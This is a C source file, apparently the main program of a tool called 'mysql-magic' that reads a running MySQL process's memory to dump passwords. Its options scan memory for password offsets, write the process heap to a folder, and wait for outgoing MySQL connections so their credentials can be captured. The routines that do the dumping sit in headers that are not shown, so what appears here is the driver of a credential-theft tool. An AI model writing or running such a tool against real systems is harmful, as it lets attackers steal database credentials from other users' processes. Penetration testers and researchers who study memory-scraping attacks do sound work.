#include <stdlib.h>
#include <stdio.h>
#include <getopt.h>
#include <unistd.h>
#include <ignotum.h>

#include "dump-password.h"
#include "mysql-magic.h"
#include "offset-scan.h"
#include "connection-listen.h"
#include "globals.h"

// global
uid_t uid;


options_t opts;

void help(void){
    const char *banner =
        "mysql-magic [options] <pid>\n"
        " -o <offset>   Comma-separated list of offset\n"
        " -s            Search the memory for passwords and get offset\n"
        " -d <dir>      Write heap to the folder\n"
        " -l            Listen mode, wait for outgoing ipv4 connections on port 3306\n"
        " -r <secs>     Sleep time (Default: 3 seconds)\n"
        " -p            Use process_vm_readv instead of /proc/pid/mem";

    puts(banner);
    exit(0);
}

off_t *parser_offset(char *str){
    off_t *ret = NULL;
    off_t aux;
    int n = 0;

    while(1){
        aux = strtol(str, &str, 16);
        if(aux <= 0){
            printf("invalid offset\n");
            exit(1);
        }

        ret = realloc(ret, sizeof(off_t)*(n+2));
        ret[n] = aux;
        n++;

        if(*str == ','){
            str++;
        } else {
            break;
        }
    }

    ret[n] = 0x0;

    return ret;
}

int main(int argc, char **argv){
    off_t *offset;

    pid_t pid = 0;
    char *pstr;
    int opt;

    opts.stime = 3;

    while((opt = getopt(argc, argv, "o:sd:lr:p")) != -1){
        switch(opt){
            case 'o':
                opts.offset = optarg;
                break;
            case 's':
                opts.scan = 1;
                break;
            case 'd':
                output_folder = optarg;
                break;
            case 'l':
                opts.listen = 1;
                break;
            case 'r':
                opts.stime = atoi(optarg);
                if(opts.stime <= 0){
                    printf("invalid number\n");
                    return 1;
                }
                break;
            case 'p':
                memreadfunc = xprocess_vm_readv;
                break;
            default:
                return 1;
        }
    }

    if(opts.scan)
        return mysql_offset_scan();

    if((pstr = argv[optind])){
        pid = atoi(pstr);

        if(pid <= 0){
            printf("invalid pid %s\n", pstr);
            return 1;
        }
    }

    if((!opts.listen && !pid) || !opts.offset){
        help();
    }

    offset = parser_offset(opts.offset);
    if(offset == NULL){
        printf("invalid offset\n");
        return 1;
    }


    if(pid)
        dump_mysql_password(pid, offset);

    // disable printf buffer
    setbuf(stdout, NULL);

    uid = getuid();

    if(opts.listen)
        wait_for_connections(offset, opts.stime);

    return 0;
}
